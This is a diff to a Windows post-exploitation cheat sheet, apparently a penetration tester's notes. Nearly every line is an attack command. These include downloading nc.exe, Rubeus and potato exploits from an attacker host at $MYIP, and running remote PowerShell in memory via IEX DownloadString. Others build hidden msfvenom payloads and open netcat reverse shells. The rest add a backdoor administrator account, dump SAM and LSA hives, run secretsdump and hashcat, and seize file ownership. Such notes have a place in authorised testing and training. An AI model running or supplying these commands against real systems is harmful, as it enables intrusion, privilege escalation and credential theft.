@@ -1287,15 +1287,19 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/
 
 [*] File Transfer
 reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; wget http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe; curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe; curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe; certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe; certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat
+curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl http://$MYIP:8888/windows/PowerView.ps1 -o \programdata\PowerView.ps1
+curl http://$MYIP:8888/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
+curl http://$MYIP:8888/windows/Rubeus.exe -o \programdata\Rubeus.exe
+curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
+wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
 powershell -c "whoami /user /priv /groups"
 Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,AdminCount | Select SamAccountName,AdminCount,@{N='Groups';E={[string]::Join('; ',($_.MemberOf|%{($_ -split ',')[0]-replace '^CN='}))}} | Sort AdminCount -Desc | Format-Table -AutoSize -Wrap
-
 net user $USERNAME
 
 +---------- Switch User: Known Creds ----------+
@@ -1327,12 +1331,22 @@ powershell -c "tree $env:APPDATA/.. /a /f"
 powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 powershell -c "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
 powershell -c "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
-powershell -c "Import-Module ActiveDirectory"
 powershell -c "Get-ADComputer DC1 -property *"
 powershell -c "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
 powershell -c "Get-ADObject -filter { SAMAccountName -eq 'TempAdmin' } -includeDeletedObjects -property *"
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"
+
++---------- Full Privesc Scan ----------+
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/PrivescCheck.ps1');Invoke-PrivescCheck
+
++---------- Transfer Files from Windows ----------+
+[Convert]::ToBase64String([IO.File]::ReadAllBytes((Get-Location).Path + "\file"))
+echo '' | base64 -d > file
+
++---------- File Permissions ----------+
+powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
+takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
 
 +---------- Unquoted Paths ----------+
 powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"
@@ -1341,11 +1355,13 @@ powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
++---------- DPAPI ----------+
+Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Write-Output "==== $($_.Name) ===="; try { Get-ChildItem "$($_.FullName)\AppData\Roaming\Microsoft" -Recurse -Force -ErrorAction Stop | Select-Object -ExpandProperty FullName } catch { Write-Output "Unable to read." } }
+
 +---------- Shell From File ----------+
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f exe > x.exe
 rlwrap nc -lvnp 5555
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP> WEB DELIVERY' EXITFUNC=none -f dll > x.dll
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP> WEB DELIVERY' EXITFUNC=none -f exe > x.exe
-curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 powershell -c "\programdata\bat2exe.bat $MYIP 5555; \programdata\x.exe"
 
 +---------- Shell From Memory ----------+
@@ -1354,8 +1370,8 @@ rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
 
 +---------- Other Exploits ----------+
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5566 -e cmd\"" -z
-C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
 C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 https://ohpe.it/juicy-potato/CLSID/
 Windows Server 2008     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
@@ -1365,9 +1381,8 @@ Windows 7               {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
 Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
-+---------- Dump Hashes (Local / Remote)----------+
++---------- Dump Hashes (Local / Remote) ----------+
 net user dbf 123qweasdF! /add && net localgroup Administrators dbf /add
 
 cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system
@@ -1390,10 +1405,6 @@ hashcat -m 1000 -a 0 hashes $rockyou
 
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-
-+---------- File Permissions ----------+
-powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
-takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
 
 +---------- Other ----------+
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
